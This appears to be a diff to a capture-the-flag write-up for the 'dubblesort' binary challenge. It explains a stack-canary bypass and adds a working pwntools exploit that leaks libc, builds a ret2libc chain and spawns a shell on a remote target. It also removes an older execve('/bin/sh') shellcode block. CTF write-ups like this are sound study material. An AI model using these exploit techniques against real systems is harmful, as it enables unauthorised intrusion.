@@ -1095,8 +1095,16 @@ There are few possible cool ideas:
 
 2. While we corrupt the outermost main's frame stack, notice the inner function that actually performs the sort, is also guarded with a stack canary - and this is the exact same canary. Hence, if we can make sure the innermost frame would get sorted, such that the inner frame's canary would be written at the outer frame's canary address, we would bypass this check. 
 
+3. Recall the usage of a bad character, such as `'A'`, being parsed by `printf("%u")`. In that case, **the character would remain within the IO-stdin buffer, while leaving the corresponding memory untouched**. We can exploit this mechanism, such that the canary won't be overwritten, yet we would write libc addresses past it!
+
+After some debugging, I've chose option(3), which is a very cool vuln. \
+Simply setting small ROP chain to jump back to libc, and we get a shell. 
 
 ### Solution
+
+The following script works both locally and remote :) \
+Notice that because the canary's value is randomized, it is being sorted to different addresses. 
+Hence, this have to be runned multiple times to obtain the flag. 
 
 ```python
 #!/usr/bin/python3
@@ -1109,35 +1117,42 @@ context.arch='i386'
 BINARY = './dubblesort'
 LIBC = './libc.so.6'
 LD = './ld-2.23.so'
+# GDB_SCRIPT = '''
+# ni
+# ni
+# fin
+# tb __libc_start_main
+# commands
+#     p/x *(int *)($esp + 4)
+#     b *$1
+#     c
+# end
+
+# c
+# '''
+
 GDB_SCRIPT = '''
+b *main-0x9c3+0x965
+
 c
 '''
 
-SHELLCODE = '''
-mov ebx, {0}
-xor ecx, ecx
-xor edx, edx
-push 0x0b
-pop eax
-int 0x80
-
-BIN_SH:
-.ascii "/bin/sh"
-.byte 0x00
-'''
-
-# Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
-OFFSET_TO_BIN_SH = 0x0e
-
 # Constants
-IS_DEBUG = True
-IS_REMOTE = False
+IS_DEBUG = False 
+IS_REMOTE = True
+NAME_LEAK_SIZE = 0x19 if IS_DEBUG else 0x1d
+NUMBERS_SIZE = 0x18
 
 # Offsets
-NAME_LEAK = 0x4 if IS_DEBUG else 0x1
-
+LIBC_LEAK_TO_BASE = 0x1b0000
 
 # Addresses
+libc = ELF(LIBC)
+bin_sh = next(libc.search(b'/bin/sh'))
+system = libc.symbols['system']
+log.info(f'bin_sh: {hex(bin_sh)}')
+log.info(f'system: {hex(system)}')
+
 libc_rop = ROP(LIBC)
 pop_eax_ret = libc_rop.eax.address
 pop_ebx_ret = libc_rop.ebx.address
@@ -1174,28 +1189,49 @@ def recvPointer(p, sizeof_ptr = 4):
     leak = u32(leak)
     return leak
 
-def getLeaks(p):
+def get_libc_base(p):
     p.recvuntil(b'What your name :')
-    name = b'A' * NAME_LEAK
+    name = b'A' * NAME_LEAK_SIZE
     p.send(name)
-    p.recvuntil(b'Hello ')
+    p.recvuntil(b'Hello ' + name[:-1])
     
-    libc_leak = recvPointer(p)
-    log.info(f'libc_leak: {hex(libc_leak)}')
-    
-    stack_leak = recvPointer(p)
-    log.info(f'stack_leak: {hex(stack_leak)}')
-    
+    libc_leak = recvPointer(p) - ord('A')
+    libc_base = libc_leak - LIBC_LEAK_TO_BASE
+    log.info(f'libc_leak: {hex(libc_leak)} libc_base: {hex(libc_base)}')
+    assert((libc_base & 0xfff) == 0)
+
     p.recvuntil(b',How many numbers do you what to sort :')
-    return libc_leak, stack_leak
+    return libc_base 
+
+def sendNumbers(p, nums, size):
+    p.sendline(str(size).encode())
+    p.recvuntil(b'Enter the 0 number : ')
+    buf = b''
+    for num in nums:
+        buf += str(num).encode() + b' '
+   
+    # Critical - printf("%u") fails parsing this character, leaving uninitialized memory, while the character remains within the stdin buffer!
+    buf += b'A'  
+    p.sendline(buf)
 
 def exploit(p):
-    libc_leak, stack_leak = getLeaks(p)
+    libc_base = get_libc_base(p)
+    # This number is larger than the canary, yet smaller than all of libc's addresses
+    large_num = libc_base - 0x1000
+
+    # First, fill crap
+    libc_bin_sh = libc_base + bin_sh
+    libc_system = libc_base + system
+    nums = [libc_system] * 7 + [libc_bin_sh] * 9
+    nums += [1] * (NUMBERS_SIZE - len(nums))
+
+    sendNumbers(p, nums, len(nums) + 32)
 
 
 def main():
     if IS_DEBUG:
-        p = gdb.debug([LD, BINARY], env={"LD_PRELOAD": LIBC}, gdbscript=GDB_SCRIPT)
+        # p = gdb.debug([LD, BINARY], env={"LD_PRELOAD": LIBC}, gdbscript=GDB_SCRIPT)
+        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
         # pid = int(process('pgrep -f "./dubblesort"', shell=True).readline()[:-1])
         # p = gdb.attach(pid, gdbscript=GDB_SCRIPT)
     else:
@@ -1212,6 +1248,10 @@ def main():
 if __name__ == '__main__':
     main()
 ```
+
+## hacknote
+
+TODO
 
 [elf-start]: http://www.dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html
 [glibc-all-in-one]: https://github.com/matrix1001/glibc-all-in-one
